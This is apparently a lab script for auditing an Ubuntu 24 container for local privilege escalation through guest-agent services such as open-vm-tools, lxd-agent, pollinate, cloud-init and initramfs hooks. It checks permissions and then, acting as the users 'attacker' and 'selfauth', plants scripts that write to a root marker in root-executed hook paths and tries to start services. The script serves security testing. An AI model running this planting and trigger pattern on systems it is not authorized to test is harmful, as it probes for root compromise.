#!/usr/bin/env bash
set -u -o pipefail

target="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$target" bash -s <<'TARGET'
set +e
export LC_ALL=C

probe="hypervisor_agent_default"
work="/tmp/${probe}"
created_list="${work}/created-paths"
root_marker="/root/${probe}_root_marker"

section() {
  printf '\n## %s\n' "$1"
}

run_as() {
  user="$1"
  label="$2"
  cmd="$3"
  printf '\n### %s: %s\n' "$user" "$label"
  timeout 20s runuser -u "$user" -- bash -lc "$cmd" 2>&1
  printf 'rc=%s\n' "$?"
}

pkg_line() {
  pkg="$1"
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>/dev/null ||
    printf '%s\t(not installed)\tun\n' "$pkg"
}

stat_path() {
  p="$1"
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$p" 2>&1
    getcap "$p" 2>/dev/null || true
  else
    printf 'MISSING %s\n' "$p"
  fi
}

show_unit() {
  u="$1"
  printf '\n### %s\n' "$u"
  systemctl show \
    -p LoadState -p UnitFileState -p ActiveState -p SubState -p Result \
    -p ConditionResult -p FragmentPath -p User -p Group -p ExecStart \
    -p ExecStartPre -p Triggers -p TriggeredBy "$u" 2>&1 || true
}

snippet() {
  f="$1"
  printf '\n### %s\n' "$f"
  if [ -e "$f" ] || [ -L "$f" ]; then
    nl -ba "$f" | sed -n '1,220p'
  else
    echo "MISSING"
  fi
}

cleanup_created() {
  if [ -s "$created_list" ]; then
    while IFS= read -r p; do
      rm -f "$p" 2>/dev/null || true
    done < "$created_list"
  fi
  rm -rf "$work" /tmp/hypervisor_agent_default.* \
    /home/attacker/hypervisor_agent_default \
    /home/selfauth/hypervisor_agent_default 2>/dev/null || true
}

rm -rf "$work"
mkdir -p "$work"
chmod 1777 "$work"
rm -f "$root_marker"
: > "$created_list"
chmod 666 "$created_list"

section "target, users, and default install proof"
sed -n '1,8p' /etc/os-release
uname -a
ps -p 1 -o user=,comm=,args=
systemctl is-system-running 2>&1 || true
printf 'systemd-detect-virt -v: '; systemd-detect-virt -v 2>&1 || true
printf 'systemd-detect-virt -c: '; systemd-detect-virt -c 2>&1 || true
printf 'systemd-detect-virt --vm: '; systemd-detect-virt --vm 2>&1 || true
id attacker
id selfauth
printf '\n[manual package seeds]\n'
apt-mark showmanual 2>/dev/null | sort | sed -n '1,80p'

section "package versions"
for pkg in \
  ubuntu-minimal ubuntu-standard ubuntu-server systemd dbus policykit-1 \
  open-vm-tools open-vm-tools-desktop open-vm-tools-containerinfo \
  open-vm-tools-sdmp lxd-agent-loader lxd-installer pollinate \
  cloud-init cloud-guest-utils cloud-initramfs-copymods \
  cloud-initramfs-dyn-netconf cloud-initramfs-tools initramfs-tools \
  initramfs-tools-core udev; do
  pkg_line "$pkg"
done | sort

section "default service, unit, and socket state before triggers"
systemctl list-unit-files --no-pager --no-legend \
  '*vmtools*' '*vgauth*' '*vmware*' '*lxd-agent*' '*lxd-installer*' \
  '*pollinate*' '*cloud*' '*initramfs*' 2>&1 | sort
for u in \
  open-vm-tools.service vmtoolsd.service vgauth.service lxd-agent.service \
  lxd-installer.socket lxd-installer@hypervisor-agent-default.service pollinate.service \
  cloud-init-local.service cloud-init.service cloud-config.service \
  cloud-final.service plymouth-switch-root-initramfs.service; do
  show_unit "$u"
done
printf '\n[matching sockets]\n'
systemctl list-sockets --all --no-pager --no-legend 2>&1 |
  grep -Ei 'vmware|vmtools|vgauth|lxd|pollinate|cloud|initramfs|agent|vsock' || true
printf '\n[active processes]\n'
ps -eo user,pid,ppid,comm,args | grep -Ei 'vmtools|vgauth|lxd-agent|lxd-installer|pollinate|cloud-init|initramfs' | grep -v grep || true

section "local IPC and RPC surface inventory"
for p in \
  /run/lxd-installer.socket /run/vmware /run/vmware-tools /var/run/vmware \
  /var/run/vmware-tools /run/vmblock-fuse /dev/vsock /proc/net/vsock \
  /dev/virtio-ports /dev/virtio-ports/com.canonical.lxd \
  /dev/virtio-ports/org.linuxcontainers.lxd /run/lxd_agent \
  /run/lxd_agent/lxd-agent /run/cloud-init /run/initramfs; do
  stat_path "$p"
done
printf '\n[unix sockets]\n'
ss -xlpn 2>&1 | grep -Ei 'vmware|vmtools|vgauth|lxd|pollinate|cloud|agent|vsock' || true
printf '\n[system bus names]\n'
busctl --system list --no-pager 2>&1 | grep -Ei 'vmware|vgauth|lxd|pollinate|cloud|agent' || true
printf '\n[system bus service files]\n'
for d in /usr/share/dbus-1/system-services /etc/dbus-1/system.d /usr/share/dbus-1/system.d; do
  [ -d "$d" ] || continue
  find "$d" -maxdepth 1 -type f \( \
    -iname '*vmware*' -o -iname '*vgauth*' -o -iname '*lxd*' \
    -o -iname '*pollinate*' -o -iname '*cloud*' -o -iname '*agent*' \
  \) -print -exec sed -n '1,120p' {} \; 2>/dev/null
done

section "unit files, udev rules, and helper scripts"
for f in \
  /usr/lib/systemd/system/open-vm-tools.service \
  /usr/lib/systemd/system/vgauth.service \
  /usr/lib/systemd/system/lxd-agent.service \
  /usr/lib/systemd/system/lxd-installer.socket \
  /usr/lib/systemd/system/lxd-installer@.service \
  /usr/lib/systemd/system/pollinate.service \
  /lib/udev/rules.d/60-open-vm-tools.rules \
  /lib/udev/rules.d/99-lxd-agent.rules \
  /lib/systemd/lxd-agent-setup \
  /usr/share/lxd-installer/lxd-installer-service \
  /usr/bin/pollinate \
  /usr/share/initramfs-tools/hooks/copymods \
  /usr/share/initramfs-tools/hooks/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/scripts/init-bottom/copymods \
  /usr/share/initramfs-tools/scripts/init-premount/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/scripts/init-bottom/cloud-initramfs-dyn-netconf; do
  snippet "$f"
done

section "helper, config, and state path permissions"
for p in \
  /usr/bin/vmtoolsd /usr/bin/VGAuthService /usr/bin/vmware-toolbox-cmd \
  /usr/bin/vmware-checkvm /usr/bin/vmhgfs-fuse /usr/sbin/mount.vmhgfs \
  /etc/vmware-tools /etc/vmware-tools/tools.conf \
  /etc/vmware-tools/tools.conf.example /etc/vmware-tools/vgauth.conf \
  /etc/vmware-tools/scripts /etc/vmware-tools/scripts/vmware \
  /etc/vmware-tools/scripts/vmware/network /etc/vmware-tools/poweron-vm-default \
  /etc/vmware-tools/poweroff-vm-default /etc/vmware-tools/resume-vm-default \
  /etc/vmware-tools/suspend-vm-default /usr/share/open-vm-tools \
  /var/lib/vmware /var/log/vmware /tmp/vmware-root /tmp/vmware-attacker \
  /lib/systemd/lxd-agent-setup /usr/share/lxd-installer/lxd-installer-service \
  /sbin/lxc /sbin/lxd /snap /usr/bin/pollinate /etc/pollinate \
  /etc/default/pollinate /var/cache/pollinate /var/cache/pollinate/seeded \
  /etc/initramfs-tools /etc/initramfs-tools/hooks /etc/initramfs-tools/conf.d \
  /etc/initramfs-tools/scripts /usr/share/initramfs-tools/hooks \
  /usr/share/initramfs-tools/scripts /usr/share/initramfs-tools/scripts/init-bottom \
  /usr/share/initramfs-tools/scripts/init-premount /boot /var/lib/initramfs-tools \
  /etc/cloud /var/lib/cloud; do
  stat_path "$p"
done

section "world-writable paths under this lane"
for d in /etc/vmware-tools /usr/share/open-vm-tools /run /var/lib /var/cache \
  /etc/initramfs-tools /usr/share/initramfs-tools /etc/pollinate /dev; do
  [ -d "$d" ] || continue
  find "$d" -xdev -maxdepth 3 -perm -0002 -printf '%M %u:%g %p -> %l\n' 2>/dev/null |
    grep -Ei 'vmware|vmtools|vgauth|lxd|pollinate|cloud|initramfs|vsock|virtio' || true
done

section "uid1001 and uid1002 write checks for root hooks/config/state"
for user in attacker selfauth; do
  run_as "$user" "existing file and directory writability" '
for p in \
  /etc/vmware-tools/tools.conf \
  /etc/vmware-tools/vgauth.conf \
  /etc/vmware-tools/scripts/vmware/network \
  /etc/vmware-tools/scripts/vmware \
  /etc/vmware-tools \
  /run/vmware \
  /var/lib/vmware \
  /var/log/vmware \
  /run/lxd_agent \
  /run/lxd-installer.socket \
  /dev/virtio-ports \
  /etc/default/pollinate \
  /var/cache/pollinate \
  /etc/initramfs-tools/hooks \
  /etc/initramfs-tools/conf.d \
  /usr/share/initramfs-tools/hooks \
  /usr/share/initramfs-tools/scripts/init-bottom \
  /usr/share/initramfs-tools/scripts/init-premount \
  /boot \
  /var/lib/initramfs-tools \
  /etc/cloud \
  /var/lib/cloud; do
  printf "test -w %s -> " "$p"
  test -w "$p" && echo WRITABLE || echo no
done
'
  run_as "$user" "plant candidate root-executed payloads if writable" '
marker=/root/hypervisor_agent_default_root_marker
for p in \
  /etc/vmware-tools/scripts/vmware/hypervisor_agent_default_probe \
  /etc/vmware-tools/hypervisor_agent_default_probe-default \
  /run/vmware/hypervisor_agent_default_probe \
  /var/lib/vmware/hypervisor_agent_default_probe \
  /var/log/vmware/hypervisor_agent_default_probe \
  /run/lxd_agent/hypervisor_agent_default_probe \
  /etc/udev/rules.d/99-hypervisor-agent-default-probe.rules \
  /etc/default/pollinate.hypervisor_agent_default_probe \
  /var/cache/pollinate/hypervisor_agent_default_probe \
  /etc/initramfs-tools/hooks/hypervisor_agent_default_probe \
  /etc/initramfs-tools/conf.d/hypervisor_agent_default_probe \
  /usr/share/initramfs-tools/hooks/hypervisor_agent_default_probe \
  /usr/share/initramfs-tools/scripts/init-bottom/hypervisor_agent_default_probe \
  /usr/share/initramfs-tools/scripts/init-premount/hypervisor_agent_default_probe \
  /etc/cloud/cloud.cfg.d/99-hypervisor-agent-default-probe.cfg \
  /var/lib/cloud/scripts/per-boot/hypervisor_agent_default_probe; do
  printf "write %s -> " "$p"
  mkdir -p "$(dirname "$p")" 2>/dev/null
  rm -f /tmp/hypervisor_agent_default.write.err
  if { printf "#!/bin/sh\nid > %s\n" "$marker"; } 2>/tmp/hypervisor_agent_default.write.err > "$p"; then
    chmod 755 "$p" 2>/dev/null || true
    echo WRITE_OK
    echo "$p" >> /tmp/hypervisor_agent_default/created-paths 2>/dev/null || true
  else
    cat /tmp/hypervisor_agent_default.write.err 2>/dev/null || true
  fi
done
rm -f /tmp/hypervisor_agent_default.write.err
'
done

section "uid1001 and uid1002 service and IPC trigger attempts"
for user in attacker selfauth; do
  run_as "$user" "systemctl start guest-agent units" '
for u in open-vm-tools.service vmtoolsd.service vgauth.service lxd-agent.service \
  pollinate.service lxd-installer@hypervisor-agent-default.service; do
  echo "### $u"
  systemctl start "$u" 2>&1
  echo "rc=$?"
done
'
  run_as "$user" "systemd dbus StartUnit guest-agent units" '
for u in open-vm-tools.service vgauth.service lxd-agent.service pollinate.service; do
  echo "### $u"
  busctl call --system org.freedesktop.systemd1 /org/freedesktop/systemd1 \
    org.freedesktop.systemd1.Manager StartUnit ss "$u" replace 2>&1
  echo "rc=$?"
done
'
  run_as "$user" "lxd-installer socket and lxc/lxd shim boundary" '
id
getent group lxd || true
ls -l /run/lxd-installer.socket 2>&1 || true
test -w /run/lxd-installer.socket; echo "test_w_lxd_installer_socket=$?"
python3 - <<PY
import os, socket
path="/run/lxd-installer.socket"
s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.connect(path)
    print("connect_ok", os.geteuid())
except OSError as e:
    print("connect_fail", e.errno, e.strerror, "uid", os.geteuid())
PY
/sbin/lxc version 2>&1; echo "lxc_rc=$?"
/sbin/lxd --version 2>&1; echo "lxd_rc=$?"
'
  run_as "$user" "direct helper execution remains caller uid or hardware-gated" '
id
timeout 5s vmtoolsd --cmd "info-get guestinfo.hypervisor_agent_default" 2>&1
echo "vmtoolsd_cmd_rc=$?"
timeout 5s vmware-toolbox-cmd stat raw text sessionid 2>&1
echo "toolbox_rc=$?"
timeout 5s vmware-checkvm 2>&1
echo "checkvm_rc=$?"
python3 - <<PY
import os
for p in ["/dev/vsock", "/proc/net/vsock"]:
    try:
        fd = os.open(p, os.O_RDONLY | os.O_NONBLOCK)
        print("open_ok", p, "uid", os.geteuid())
        os.close(fd)
    except OSError as e:
        print("open_fail", p, e.errno, e.strerror, "uid", os.geteuid())
PY
timeout 5s /lib/systemd/lxd-agent-setup 2>&1
echo "lxd_agent_setup_rc=$?"
pollinate --print-user-agent 2>&1
echo "pollinate_user_agent_rc=$?"
timeout 10s update-initramfs -u -v 2>&1 | sed -n "1,80p"
echo "update_initramfs_rc=${PIPESTATUS[0]}"
'
done

section "post-trigger service state and root proof sweep"
for u in open-vm-tools.service vmtoolsd.service vgauth.service lxd-agent.service \
  lxd-installer.socket pollinate.service; do
  show_unit "$u"
done
if [ -e "$root_marker" ]; then
  echo "ROOT_MARKER_PRESENT"
  ls -l "$root_marker"
  cat "$root_marker"
else
  echo "NO_ROOT_MARKER"
fi
find /root /tmp /home/attacker /home/selfauth -maxdepth 3 \
  \( -name '*hypervisor_agent_default*' -o -name '*vmtools*probe*' -o -name '*lxd*agent*probe*' \) \
  -printf '%M %u:%g %p\n' 2>/dev/null || true

section "cleanup"
cleanup_created
echo "removed probe-created candidate payloads and /tmp user scratch files"
TARGET
